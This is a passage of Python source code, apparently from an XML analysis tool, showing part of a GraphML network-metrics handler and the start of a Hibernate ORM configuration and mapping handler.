            'edges': self._analyze_edges(root),
            'attributes': self._analyze_attributes(root),
            'network_metrics': self._calculate_network_metrics(root),
            'data_properties': self._analyze_data_properties(root),
            'layout_info': self._analyze_layout_information(root),
            'connectivity': self._analyze_connectivity(root)
        }
        
        recommendations = [
            "Perform network analysis and centrality calculations",
            "Visualize graph structure with layout algorithms",
            "Detect communities and clustering patterns",
            "Analyze shortest paths and connectivity",
            "Extract subgraphs and components",
            "Calculate graph metrics (diameter, density, clustering)",
            "Apply graph algorithms (PageRank, betweenness centrality)",
            "Generate graph statistics and reports",
            "Export to analysis tools (NetworkX, Gephi, Cytoscape)",
            "Validate graph integrity and detect anomalies"
        ]
        
        ai_use_cases = [
            "Social network analysis and community detection",
            "Neural network architecture analysis",
            "Knowledge graph construction and reasoning",
            "Dependency graph analysis for software systems",
            "Biological network analysis (protein interactions)",
            "Transportation network optimization",
            "Citation network analysis and ranking",
            "Graph-based recommendation systems",
            "Fraud detection through network patterns",
            "Supply chain network analysis and optimization"
        ]
        
        return SpecializedAnalysis(
            document_type="GraphML Network",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'total_graphs': findings['graph_structure']['graph_count'],
                'total_nodes': findings['nodes']['node_count'],
                'total_edges': findings['edges']['edge_count'],
                'attribute_keys': findings['attributes']['key_count'],
                'data_elements': findings['data_properties']['data_count']
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_graph_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'graph_metadata': self._extract_graph_metadata(root),
            'node_catalog': self._extract_node_catalog(root),
            'edge_catalog': self._extract_edge_catalog(root),
            'attribute_schema': self._extract_attribute_schema(root),
            'network_statistics': self._extract_network_statistics(root)
        }
    
    def _analyze_file_info(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze GraphML file information"""
        file_info = {
            'root_element': root.tag,
            'version': root.get('version'),
            'xmlns': root.get('xmlns'),
            'namespaces': {},
            'schema_location': None
        }
        
        # Extract namespaces
        if '}' in root.tag:
            namespace = root.tag.split('}')[0] + '}'
            file_info['namespaces']['graphml'] = namespace.strip('{}')
        
        # Check for schema location
        schema_attrs = [
            '{http://www.w3.org/2001/XMLSchema-instance}schemaLocation',
            'schemaLocation'
        ]
        for attr in schema_attrs:
            if attr in root.attrib:
                file_info['schema_location'] = root.get(attr)
                break
        
        return file_info
    
    def _analyze_graph_structure(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze graph structure and properties"""
        ns = self._get_namespace(root)
        structure_info = {
            'graph_count': 0,
            'graphs': [],
            'directed_graphs': 0,
            'undirected_graphs': 0,
            'mixed_graphs': 0
        }
        
        graphs = root.findall(f'{ns}graph')
        structure_info['graph_count'] = len(graphs)
        
        for graph in graphs:
            graph_data = {
                'id': graph.get('id'),
                'edgedefault': graph.get('edgedefault', 'undirected'),
                'node_count': len(graph.findall(f'{ns}node')),
                'edge_count': len(graph.findall(f'{ns}edge')),
                'hyperedge_count': len(graph.findall(f'{ns}hyperedge')),
                'subgraph_count': len(graph.findall(f'{ns}graph'))
            }
            
            # Count graph types
            edge_default = graph_data['edgedefault']
            if edge_default == 'directed':
                structure_info['directed_graphs'] += 1
            elif edge_default == 'undirected':
                structure_info['undirected_graphs'] += 1
            else:
                structure_info['mixed_graphs'] += 1
            
            structure_info['graphs'].append(graph_data)
        
        return structure_info
    
    def _analyze_nodes(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze node information"""
        ns = self._get_namespace(root)
        node_info = {
            'node_count': 0,
            'nodes': [],
            'node_attributes': {},
            'isolated_nodes': 0,
            'max_degree': 0
        }
        
        nodes = root.findall(f'.//{ns}node')
        node_info['node_count'] = len(nodes)
        
        # Build edge reference map for degree calculation
        edge_map = {}
        edges = root.findall(f'.//{ns}edge')
        for edge in edges:
            source = edge.get('source')
            target = edge.get('target')
            if source:
                edge_map[source] = edge_map.get(source, 0) + 1
            if target and target != source:  # Avoid double counting self-loops
                edge_map[target] = edge_map.get(target, 0) + 1
        
        for node in nodes[:100]:  # Limit for performance
            node_data = {
                'id': node.get('id'),
                'data_elements': len(node.findall(f'{ns}data')),
                'ports': len(node.findall(f'{ns}port')),
                'degree': edge_map.get(node.get('id'), 0)
            }
            
            # Track max degree
            node_info['max_degree'] = max(node_info['max_degree'], node_data['degree'])
            
            # Count isolated nodes
            if node_data['degree'] == 0:
                node_info['isolated_nodes'] += 1
            
            # Extract node attributes from data elements
            for data in node.findall(f'{ns}data'):
                key = data.get('key')
                if key:
                    if key not in node_info['node_attributes']:
                        node_info['node_attributes'][key] = 0
                    node_info['node_attributes'][key] += 1
            
            node_info['nodes'].append(node_data)
        
        return node_info
    
    def _analyze_edges(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze edge information"""
        ns = self._get_namespace(root)
        edge_info = {
            'edge_count': 0,
            'edges': [],
            'edge_attributes': {},
            'directed_edges': 0,
            'undirected_edges': 0,
            'self_loops': 0,
            'parallel_edges': 0
        }
        
        edges = root.findall(f'.//{ns}edge')
        edge_info['edge_count'] = len(edges)
        
        # Track parallel edges
        edge_pairs = {}
        
        for edge in edges[:100]:  # Limit for performance
            edge_data = {
                'id': edge.get('id'),
                'source': edge.get('source'),
                'target': edge.get('target'),
                'directed': edge.get('directed'),
                'data_elements': len(edge.findall(f'{ns}data'))
            }
            
            # Count self-loops
            if edge_data['source'] == edge_data['target']:
                edge_info['self_loops'] += 1
            
            # Track parallel edges
            if edge_data['source'] and edge_data['target']:
                pair = tuple(sorted([edge_data['source'], edge_data['target']]))
                edge_pairs[pair] = edge_pairs.get(pair, 0) + 1
            
            # Count directed vs undirected
            if edge_data['directed'] == 'true':
                edge_info['directed_edges'] += 1
            elif edge_data['directed'] == 'false':
                edge_info['undirected_edges'] += 1
            
            # Extract edge attributes from data elements
            for data in edge.findall(f'{ns}data'):
                key = data.get('key')
                if key:
                    if key not in edge_info['edge_attributes']:
                        edge_info['edge_attributes'][key] = 0
                    edge_info['edge_attributes'][key] += 1
            
            edge_info['edges'].append(edge_data)
        
        # Count parallel edges
        edge_info['parallel_edges'] = sum(1 for count in edge_pairs.values() if count > 1)
        
        return edge_info
    
    def _analyze_attributes(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze attribute key definitions"""
        ns = self._get_namespace(root)
        attr_info = {
            'key_count': 0,
            'keys': [],
            'attribute_domains': {},
            'attribute_types': {},
            'for_types': {}
        }
        
        keys = root.findall(f'{ns}key')
        attr_info['key_count'] = len(keys)
        
        for key in keys:
            key_data = {
                'id': key.get('id'),
                'for': key.get('for'),
                'attr_name': key.get('attr.name'),
                'attr_type': key.get('attr.type', 'string'),
                'default_value': None,
                'description': None
            }
            
            # Extract default value
            default = key.find(f'{ns}default')
            if default is not None and default.text:
                key_data['default_value'] = default.text
            
            # Extract description
            desc = key.find(f'{ns}desc')
            if desc is not None and desc.text:
                key_data['description'] = desc.text
            
            # Track attribute domains and types
            if key_data['for']:
                attr_info['for_types'][key_data['for']] = \
                    attr_info['for_types'].get(key_data['for'], 0) + 1
            
            if key_data['attr_type']:
                attr_info['attribute_types'][key_data['attr_type']] = \
                    attr_info['attribute_types'].get(key_data['attr_type'], 0) + 1
            
            attr_info['keys'].append(key_data)
        
        return attr_info
    
    def _analyze_data_properties(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze data elements and their properties"""
        ns = self._get_namespace(root)
        data_info = {
            'data_count': 0,
            'data_elements': [],
            'key_usage': {},
            'value_types': {},
            'empty_data': 0
        }
        
        data_elements = root.findall(f'.//{ns}data')
        data_info['data_count'] = len(data_elements)
        
        # Build parent mapping for data elements
        parent_map = {}
        for elem in root.iter():
            for child in elem:
                parent_map[child] = elem
        
        for data in data_elements[:200]:  # Limit for performance
            parent = parent_map.get(data)
            parent_type = parent.tag.split('}')[-1] if parent is not None else None
            
            data_data = {
                'key': data.get('key'),
                'value': data.text,
                'has_content': bool(data.text and data.text.strip()),
                'parent_type': parent_type
            }
            
            # Track key usage
            if data_data['key']:
                data_info['key_usage'][data_data['key']] = \
                    data_info['key_usage'].get(data_data['key'], 0) + 1
            
            # Count empty data
            if not data_data['has_content']:
                data_info['empty_data'] += 1
            
            # Analyze value types
            if data_data['value']:
                value_type = self._detect_value_type(data_data['value'])
                data_info['value_types'][value_type] = \
                    data_info['value_types'].get(value_type, 0) + 1
            
            data_info['data_elements'].append(data_data)
        
        return data_info
    
    def _analyze_layout_information(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze layout and visual information"""
        layout_info = {
            'has_coordinates': False,
            'coordinate_keys': [],
            'visual_attributes': [],
            'geometric_data': False
        }
        
        # Look for common layout attribute keys
        coordinate_indicators = ['x', 'y', 'z', 'pos', 'position', 'coord', 'layout']
        visual_indicators = ['color', 'size', 'width', 'height', 'shape', 'style', 'label']
        
        for key in root.findall('.//key'):
            attr_name = key.get('attr.name', '').lower()
            key_id = key.get('id', '').lower()
            
            # Check for coordinate attributes
            if any(coord in attr_name or coord in key_id for coord in coordinate_indicators):
                layout_info['has_coordinates'] = True
                layout_info['coordinate_keys'].append(key.get('id'))
            
            # Check for visual attributes
            if any(visual in attr_name or visual in key_id for visual in visual_indicators):
                layout_info['visual_attributes'].append(key.get('id'))
        
        # Check for geometric data in values
        for data in root.findall('.//data'):
            if data.text:
                # Look for numeric coordinates or geometric data
                if re.search(r'-?\d+\.?\d*,-?\d+\.?\d*', data.text):
                    layout_info['geometric_data'] = True
                    break
        
        return layout_info
    
    def _analyze_connectivity(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze graph connectivity patterns"""
        ns = self._get_namespace(root)
        connectivity_info = {
            'total_components': 0,
            'largest_component_size': 0,
            'connectivity_ratio': 0.0,
            'average_degree': 0.0,
            'degree_distribution': {}
        }
        
        # Build adjacency information
        nodes = set()
        edges = []
        
        for node in root.findall(f'.//{ns}node'):
            node_id = node.get('id')
            if node_id:
                nodes.add(node_id)
        
        for edge in root.findall(f'.//{ns}edge'):
            source = edge.get('source')
            target = edge.get('target')
            if source and target:
                edges.append((source, target))
        
        if nodes:
            # Calculate degree distribution
            degree_count = {}
            for node in nodes:
                degree = sum(1 for s, t in edges if s == node or t == node)
                degree_count[node] = degree
                
                degree_bin = f"{degree//10*10}-{degree//10*10+9}"
                connectivity_info['degree_distribution'][degree_bin] = \
                    connectivity_info['degree_distribution'].get(degree_bin, 0) + 1
            
            # Calculate average degree
            total_degree = sum(degree_count.values())
            connectivity_info['average_degree'] = total_degree / len(nodes) if nodes else 0
            
            # Estimate connectivity (simplified)
            max_possible_edges = len(nodes) * (len(nodes) - 1) // 2
            actual_edges = len(edges)
            connectivity_info['connectivity_ratio'] = actual_edges / max_possible_edges if max_possible_edges > 0 else 0
        
        return connectivity_info
    
    def _calculate_network_metrics(self, root: ET.Element) -> Dict[str, Any]:
        """Calculate basic network metrics"""
        metrics = {
            'density': 0.0,
            'avg_clustering': 0.0,
            'diameter_estimate': 0,
            'assortativity_estimate': 0.0,
            'modularity_estimate': 0.0
        }
        
        node_count = len(root.findall('.//node'))
        edge_count = len(root.findall('.//edge'))
        
        # Calculate density
        if node_count > 1:
            max_possible_edges = node_count * (node_count - 1) // 2
            metrics['density'] = edge_count / max_possible_edges if max_possible_edges > 0 else 0
        
        # Estimate diameter (rough approximation)
        if node_count > 0 and edge_count > 0:
            avg_degree = (2 * edge_count) / node_count
            if avg_degree > 1:
                metrics['diameter_estimate'] = max(2, int(math.log(node_count) / math.log(avg_degree)))
        
        # Simple clustering estimate
        if metrics['density'] > 0:
            metrics['avg_clustering'] = min(metrics['density'] * 2, 1.0)
        
        return metrics
    
    def _detect_value_type(self, value: str) -> str:
        """Detect the type of a data value"""
        value = value.strip()
        
        # Check for numeric types
        try:
            if '.' in value:
                float(value)
                return 'float'
            else:
                int(value)
                return 'integer'
        except ValueError:
            pass
        
        # Check for boolean
        if value.lower() in ['true', 'false', 'yes', 'no', '1', '0']:
            return 'boolean'
        
        # Check for URL
        if value.startswith(('http://', 'https://', 'ftp://')):
            return 'url'
        
        # Check for coordinates
        if re.match(r'-?\d+\.?\d*,-?\d+\.?\d*', value):
            return 'coordinates'
        
        # Check for date-like
        if re.match(r'\d{4}-\d{2}-\d{2}', value):
            return 'date'
        
        return 'string'
    
    def _extract_graph_metadata(self, root: ET.Element) -> Dict[str, Any]:
        """Extract high-level graph metadata"""
        metadata = {
            'file_version': root.get('version'),
            'namespace': root.get('xmlns'),
            'graph_count': len(root.findall('.//graph')),
            'total_nodes': len(root.findall('.//node')),
            'total_edges': len(root.findall('.//edge')),
            'attribute_keys': len(root.findall('.//key')),
            'has_hierarchy': len(root.findall('.//graph//graph')) > 0
        }
        
        return metadata
    
    def _extract_node_catalog(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract node catalog with attributes"""
        nodes = []
        
        for node in root.findall('.//node')[:50]:  # Limit for performance
            node_data = {
                'id': node.get('id'),
                'attributes': {},
                'port_count': len(node.findall('.//port'))
            }
            
            # Extract node attributes
            for data in node.findall('.//data'):
                key = data.get('key')
                value = data.text
                if key and value:
                    node_data['attributes'][key] = value
            
            nodes.append(node_data)
        
        return nodes
    
    def _extract_edge_catalog(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract edge catalog with attributes"""
        edges = []
        
        for edge in root.findall('.//edge')[:50]:  # Limit for performance
            edge_data = {
                'id': edge.get('id'),
                'source': edge.get('source'),
                'target': edge.get('target'),
                'directed': edge.get('directed'),
                'attributes': {}
            }
            
            # Extract edge attributes
            for data in edge.findall('.//data'):
                key = data.get('key')
                value = data.text
                if key and value:
                    edge_data['attributes'][key] = value
            
            edges.append(edge_data)
        
        return edges
    
    def _extract_attribute_schema(self, root: ET.Element) -> Dict[str, Any]:
        """Extract attribute schema information"""
        schema = {
            'node_attributes': {},
            'edge_attributes': {},
            'graph_attributes': {},
            'all_attributes': {}
        }
        
        for key in root.findall('.//key'):
            key_info = {
                'id': key.get('id'),
                'name': key.get('attr.name'),
                'type': key.get('attr.type', 'string'),
                'domain': key.get('for', 'all'),
                'default': None,
                'description': None
            }
            
            # Extract default value
            default = key.find('.//default')
            if default is not None and default.text:
                key_info['default'] = default.text
            
            # Extract description
            desc = key.find('.//desc')
            if desc is not None and desc.text:
                key_info['description'] = desc.text
            
            # Categorize by domain
            domain = key_info['domain']
            if domain == 'node':
                schema['node_attributes'][key_info['id']] = key_info
            elif domain == 'edge':
                schema['edge_attributes'][key_info['id']] = key_info
            elif domain == 'graph':
                schema['graph_attributes'][key_info['id']] = key_info
            
            schema['all_attributes'][key_info['id']] = key_info
        
        return schema
    
    def _extract_network_statistics(self, root: ET.Element) -> Dict[str, Any]:
        """Extract network statistics"""
        stats = {
            'node_count': len(root.findall('.//node')),
            'edge_count': len(root.findall('.//edge')),
            'graph_count': len(root.findall('.//graph')),
            'data_elements': len(root.findall('.//data')),
            'attribute_keys': len(root.findall('.//key')),
            'hyperedge_count': len(root.findall('.//hyperedge')),
            'port_count': len(root.findall('.//port'))
        }
        
        # Calculate derived statistics
        if stats['node_count'] > 0:
            stats['edges_per_node'] = stats['edge_count'] / stats['node_count']
            stats['data_per_node'] = stats['data_elements'] / stats['node_count']
        else:
            stats['edges_per_node'] = 0
            stats['data_per_node'] = 0
        
        return stats
    
    def _assess_graph_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess graph data quality metrics"""
        metrics = {
            'completeness': 0.0,
            'consistency': 0.0,
            'connectivity': 0.0,
            'attribute_coverage': 0.0,
            'overall': 0.0
        }
        
        # Completeness (presence of essential elements)
        structure = findings['graph_structure']
        nodes = findings['nodes']
        edges = findings['edges']
        
        completeness_factors = []
        if structure['graph_count'] > 0:
            completeness_factors.append(0.3)
        if nodes['node_count'] > 0:
            completeness_factors.append(0.3)
        if edges['edge_count'] > 0:
            completeness_factors.append(0.2)
        if findings['attributes']['key_count'] > 0:
            completeness_factors.append(0.2)
        
        metrics['completeness'] = sum(completeness_factors)
        
        # Consistency (data integrity)
        data_props = findings['data_properties']
        consistency_score = 1.0
        
        if data_props['data_count'] > 0:
            empty_ratio = data_props['empty_data'] / data_props['data_count']
            consistency_score -= empty_ratio * 0.5
        
        metrics['consistency'] = max(0.0, consistency_score)
        
        # Connectivity (network structure quality)
        connectivity = findings['connectivity']
        metrics['connectivity'] = min(connectivity['connectivity_ratio'] * 2, 1.0)
        
        # Attribute coverage
        if nodes['node_count'] > 0:
            attr_coverage = len(nodes['node_attributes']) / max(nodes['node_count'], 1)
            metrics['attribute_coverage'] = min(attr_coverage, 1.0)
        
        # Overall quality
        metrics['overall'] = (
            metrics['completeness'] * 0.3 +
            metrics['consistency'] * 0.25 +
            metrics['connectivity'] * 0.25 +
            metrics['attribute_coverage'] * 0.2
        )
        
        return metrics
</file>

<file path="src/handlers/hibernate_handler.py">
#!/usr/bin/env python3
"""
Hibernate Configuration Handler

Analyzes Hibernate ORM configuration files and mapping files for database schema analysis,
ORM optimization, security assessment, and migration planning.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class HibernateHandler(XMLHandler):
    """Handler for Hibernate ORM configuration and mapping files"""
    
    # Hibernate DTD/namespace patterns
    HIBERNATE_CONFIG_DTD = "hibernate-configuration"
    HIBERNATE_MAPPING_DTD = "hibernate-mapping"
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for Hibernate root elements
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        # Hibernate configuration files
        if root_tag == 'hibernate-configuration':
            confidence = 0.8
            
            # Check for session-factory element
            if self._find_element_by_local_name(root, 'session-factory') is not None:
                confidence += 0.2
            
            return True, confidence
        
        # Hibernate mapping files
        elif root_tag == 'hibernate-mapping':
            confidence = 0.8
            
            # Check for class/subclass elements
            if (self._find_element_by_local_name(root, 'class') is not None or
                self._find_element_by_local_name(root, 'subclass') is not None):
                confidence += 0.2
            
            return True, confidence
        
        # Check DOCTYPE declarations
        elif hasattr(root, 'getroot'):
            # This is a more complex check for DOCTYPE
            pass
        
        # Check for Hibernate-specific patterns in any XML
        hibernate_indicators = ['session-factory', 'class', 'property', 'id', 'generator']
        indicator_count = sum(1 for indicator in hibernate_indicators 
                            if any(indicator in elem.tag for elem in root.iter()))
        
        if indicator_count >= 3:  # Multiple Hibernate indicators
            return True, min(0.6 + (indicator_count * 0.1), 1.0)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        # Determine file type
        if root_tag == 'hibernate-configuration':
            file_type = "Configuration"
            category = "hibernate_configuration"
        elif root_tag == 'hibernate-mapping':
            file_type = "Mapping"
            category = "hibernate_mapping"
        else:
            file_type = "Configuration"  # Default
            category = "hibernate_unknown"
        
        # Extract database information
        database_info = self._extract_database_info(root)
        
        metadata = {
            "orm": "Hibernate",
            "category": category,
            "file_type": file_type,
            "database_driver": database_info.get('driver'),
            "database_url": database_info.get('url'),
            "has_connection_pool": database_info.get('has_connection_pool', False),
            "entity_count": self._count_entities(root)
        }
        
        return DocumentTypeInfo(
            type_name=f"Hibernate {file_type}",
            confidence=0.95,
            version=self._detect_hibernate_version(root),
            metadata=metadata
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'hibernate-configuration':
            findings = self._analyze_configuration(root)
        elif root_tag == 'hibernate-mapping':
            findings = self._analyze_mapping(root)
        else:
            # Generic analysis
            findings = {
                'hibernate_info': self._analyze_hibernate_elements(root),
                'database_info': self._extract_database_info(root),
                'entities': self._analyze_entities(root),
                'security': self._analyze_security(root)
            }
        
        recommendations = [
            "Review database connection security and credentials",
            "Analyze entity mappings for performance optimization",
            "Check for SQL injection vulnerabilities in HQL queries",
            "Validate connection pool configuration for scalability",
            "Review caching strategy and second-level cache settings",
            "Analyze lazy loading patterns for N+1 query issues",
            "Check database schema naming conventions",
            "Validate transaction management configuration"
        ]
        
        ai_use_cases = [
            "Database schema analysis and optimization",
            "ORM performance tuning and query optimization",
            "Security assessment of database configurations",
            "Migration planning and schema evolution",
            "Entity relationship mapping and documentation",
            "Connection pool monitoring and tuning",
            "Cache configuration optimization",
            "Database access pattern analysis",
            "Compliance auditing for data protection regulations"
        ]
        
        # Calculate data inventory based on findings
        data_inventory = {}
        if 'entities' in findings:
            data_inventory['entities'] = len(findings['entities']['entity_details'])
        if 'properties' in findings:
            data_inventory['properties'] = len(findings['properties']['property_details'])
        if 'database_info' in findings and findings['database_info']:
            data_inventory['connections'] = 1
        
        return SpecializedAnalysis(
            document_type=f"Hibernate {findings.get('hibernate_info', {}).get('file_type', 'Configuration')}",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_hibernate_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'hibernate_metadata': {
                'version': self._detect_hibernate_version(root),
                'file_type': self._determine_file_type(root),
                'entity_count': self._count_entities(root)
            },
            'database_summary': self._extract_database_summary(root),
            'entity_summary': self._extract_entity_summary(root),
            'configuration_summary': self._extract_configuration_summary(root)
        }
    
    def _analyze_configuration(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze Hibernate configuration file"""
        findings = {
            'hibernate_info': {
                'file_type': 'Configuration',
                'version': self._detect_hibernate_version(root)
            },
            'session_factory': self._analyze_session_factory(root),
            'database_info': self._extract_database_info(root),
            'properties': self._analyze_configuration_properties(root),
            'mappings': self._analyze_mapping_resources(root),
            'security': self._analyze_configuration_security(root),
            'performance': self._analyze_performance_settings(root)
        }
        return findings
    
    def _analyze_mapping(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze Hibernate mapping file"""
        findings = {
            'hibernate_info': {
                'file_type': 'Mapping',
                'version': self._detect_hibernate_version(root),
                'package': root.get('package')
            },
            'entities': self._analyze_entities(root),
            'relationships': self._analyze_relationships(root),
            'identifiers': self._analyze_identifiers(root),
            'properties': self._analyze_entity_properties(root),
            'collections': self._analyze_collections(root),
            'inheritance': self._analyze_inheritance(root),
            'sql_queries': self._analyze_sql_queries(root),
            'security': self._analyze_mapping_security(root)
        }
        return findings
    
    def _analyze_session_factory(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze session-factory configuration"""
        session_factory_info = {
            'present': False,
            'name': None,
            'property_count': 0,
            'mapping_count': 0,
            'class_cache_count': 0,
            'collection_cache_count': 0
        }
        
        session_factory = self._find_element_by_local_name(root, 'session-factory')
        if session_factory is not None:
            session_factory_info['present'] = True
            session_factory_info['name'] = session_factory.get('name')
            
            # Count properties
            properties = [elem for elem in session_factory.iter() 
                         if elem.tag.split('}')[-1] == 'property']
            session_factory_info['property_count'] = len(properties)
            
            # Count mappings
            mappings = [elem for elem in session_factory.iter() 
                       if elem.tag.split('}')[-1] in ['mapping', 'class-cache', 'collection-cache']]
            session_factory_info['mapping_count'] = len([m for m in mappings 
                                                        if m.tag.split('}')[-1] == 'mapping'])
            session_factory_info['class_cache_count'] = len([m for m in mappings 
                                                           if m.tag.split('}')[-1] == 'class-cache'])
            session_factory_info['collection_cache_count'] = len([m for m in mappings 
                                                                 if m.tag.split('}')[-1] == 'collection-cache'])
        
        return session_factory_info
    
    def _extract_database_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract database connection information"""
        db_info = {
            'driver': None,
            'url': None,
            'username': None,
            'dialect': None,
            'has_connection_pool': False,
            'pool_size': None,
            'show_sql': False
        }
        
        # Look for database properties
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name == 'property' and elem.get('name'):
                prop_name = elem.get('name')
                prop_value = elem.text
                
                if 'connection.driver_class' in prop_name:
                    db_info['driver'] = prop_value
                elif 'connection.url' in prop_name:
                    db_info['url'] = prop_value
                elif 'connection.username' in prop_name:
                    db_info['username'] = prop_value
                elif 'dialect' in prop_name:
                    db_info['dialect'] = prop_value
                elif 'pool_size' in prop_name:
                    db_info['pool_size'] = prop_value
                    db_info['has_connection_pool'] = True
                elif 'show_sql' in prop_name:
                    db_info['show_sql'] = prop_value and prop_value.lower() == 'true'
                elif 'c3p0' in prop_name or 'hikari' in prop_name:
                    db_info['has_connection_pool'] = True
        
        return db_info
    
    def _analyze_configuration_properties(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze configuration properties"""
        props_info = {
            'property_count': 0,
            'property_details': [],
            'categories': {
                'connection': 0,
                'dialect': 0,
                'cache': 0,
                'transaction': 0,
                'other': 0
            }
        }
        
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name == 'property' and elem.get('name'):
                prop_name = elem.get('name')
                prop_value = elem.text
                
                prop_detail = {
                    'name': prop_name,
                    'value': prop_value,
                    'category': self._categorize_property(prop_name)
                }
                
                props_info['property_details'].append(prop_detail)
                props_info['property_count'] += 1
                props_info['categories'][prop_detail['category']] += 1
        
        return props_info
    
    def _analyze_mapping_resources(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze mapping resource declarations"""
        mapping_info = {
            'mapping_count': 0,
            'mapping_details': [],
            'resource_types': {
                'resource': 0,
                'class': 0,
                'jar': 0,
                'package': 0
            }
        }
        
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name == 'mapping':
                mapping_detail = {
                    'resource': elem.get('resource'),
                    'class': elem.get('class'),
                    'jar': elem.get('jar'),
                    'package': elem.get('package')
                }
                
                mapping_info['mapping_details'].append(mapping_detail)
                mapping_info['mapping_count'] += 1
                
                # Count by type
                for res_type in mapping_info['resource_types']:
                    if mapping_detail[res_type]:
                        mapping_info['resource_types'][res_type] += 1
        
        return mapping_info
    
    def _analyze_entities(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze entity/class mappings"""
        entity_info = {
            'entity_count': 0,
            'entity_details': [],
            'inheritance_strategies': [],
            'table_names': []
        }
        
        # Find all class elements
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name in ['class', 'subclass', 'joined-subclass', 'union-subclass']:
                entity_detail = {
                    'type': elem_name,
                    'name': elem.get('name'),
                    'table': elem.get('table'),
                    'schema': elem.get('schema'),
                    'catalog': elem.get('catalog'),
                    'abstract': elem.get('abstract') == 'true',
                    'property_count': len([e for e in elem if e.tag.split('}')[-1] == 'property']),
                    'id_present': any(e.tag.split('}')[-1] == 'id' for e in elem)
                }
                
                entity_info['entity_details'].append(entity_detail)
                entity_info['entity_count'] += 1
                
                if entity_detail['table']:
                    entity_info['table_names'].append(entity_detail['table'])
                
                if elem_name in ['subclass', 'joined-subclass', 'union-subclass']:
                    entity_info['inheritance_strategies'].append(elem_name)
        
        return entity_info
    
    def _analyze_relationships(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze entity relationships"""
        rel_info = {
            'relationship_count': 0,
            'relationship_types': {
                'one-to-one': 0,
                'one-to-many': 0,
                'many-to-one': 0,
                'many-to-many': 0
            },
            'relationship_details': []
        }
        
        relationship_elements = ['one-to-one', 'one-to-many', 'many-to-one', 'many-to-many']
        
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name in relationship_elements:
                rel_detail = {
                    'type': elem_name,
                    'name': elem.get('name'),
                    'class': elem.get('class'),
                    'column': elem.get('column'),
                    'foreign_key': elem.get('foreign-key'),
                    'cascade': elem.get('cascade'),
                    'fetch': elem.get('fetch'),
                    'lazy': elem.get('lazy')
                }
                
                rel_info['relationship_details'].append(rel_detail)
                rel_info['relationship_count'] += 1
                rel_info['relationship_types'][elem_name] += 1
        
        return rel_info
    
    def _analyze_identifiers(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze entity identifiers"""
        id_info = {
            'id_strategies': [],
            'composite_ids': 0,
            'id_details': []
        }
        
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name == 'id':
                generator = self._find_element_by_local_name(elem, 'generator')
                generator_class = generator.get('class') if generator is not None else None
                
                id_detail = {
                    'name': elem.get('name'),
                    'column': elem.get('column'),
                    'type': elem.get('type'),
                    'generator': generator_class
                }
                
                id_info['id_details'].append(id_detail)
                if generator_class:
                    id_info['id_strategies'].append(generator_class)
            
            elif elem_name == 'composite-id':
                id_info['composite_ids'] += 1
        
        return id_info
    
    def _analyze_entity_properties(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze entity properties"""
        prop_info = {
            'property_count': 0,
            'property_details': [],
            'column_types': {},
            'nullable_properties': 0,
            'unique_properties': 0
        }
        
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name == 'property':
                prop_detail = {
                    'name': elem.get('name'),
                    'column': elem.get('column'),
                    'type': elem.get('type'),
                    'not_null': elem.get('not-null') == 'true',
                    'unique': elem.get('unique') == 'true',
                    'length': elem.get('length'),
                    'precision': elem.get('precision'),
                    'scale': elem.get('scale')
                }
                
                prop_info['property_details'].append(prop_detail)
                prop_info['property_count'] += 1
                
                if prop_detail['type']:
                    prop_info['column_types'][prop_detail['type']] = \
                        prop_info['column_types'].get(prop_detail['type'], 0) + 1
                
                if not prop_detail['not_null']:
